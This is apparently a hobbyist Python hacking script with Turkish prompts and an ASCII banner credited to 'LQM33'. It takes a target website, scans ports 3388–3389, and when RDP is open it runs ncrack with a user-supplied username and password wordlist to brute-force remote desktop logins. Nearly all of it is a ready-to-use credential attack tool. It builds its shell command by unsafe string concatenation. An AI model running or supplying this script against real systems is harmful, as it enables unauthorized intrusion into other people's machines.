from socket import *
import time
import os
import random
startTime = time.time()
renkler=["\033[96m","\033[91m","\033[92m","\033[93m","\033[94m","\033[95m"]
renk=random.choice(renkler)
os.system('cls' if os.name == 'nt' else 'clear')
print(renk+"""
███████╗██╗     ██╗████████╗██╗  ██╗ █████╗ ████████╗███████╗
██╔════╝██║     ██║╚══██╔══╝██║  ██║██╔══██╗╚══██╔══╝╚══███╔╝
█████╗  ██║     ██║   ██║   ███████║███████║   ██║     ███╔╝ 
██╔══╝  ██║     ██║   ██║   ██╔══██║██╔══██║   ██║    ███╔╝  
███████╗███████╗██║   ██║   ██║  ██║██║  ██║   ██║   ███████╗
╚══════╝╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
                    [CODED BY LQM33 ]
                    Instagram:lqm33.py
""")
if __name__ == '__main__':
   target = input('Taranacak Siteyi gir...: ')
   target=target.replace("https://","")
   target=target.replace("http://","")
   target=target.replace("/","")
   t_IP = gethostbyname(target)
   print ('Tarama Başlıyor: ', t_IP)
   
   for i in range(3388, 3390):
      s = socket(AF_INET, SOCK_STREAM)
      
      conn = s.connect_ex((t_IP, i))
      if(conn == 0) :
         print ('Port %d: Açık' % (i,))
         print("Saldırı Yapılabilir !")
         ad=input("Username'i giriniz...:")
         passtxt=input("Wordlist yolunu giriniz...:")
         t_IP=str(t_IP)
         t_IP=t_IP+":3389"
         os.system("ncrack -u "+ad+" -P "+passtxt+" "+t_IP+" -v")
      else:
         print("Port Kapalı")
      s.close()

print('Süre:', time.time() - startTime)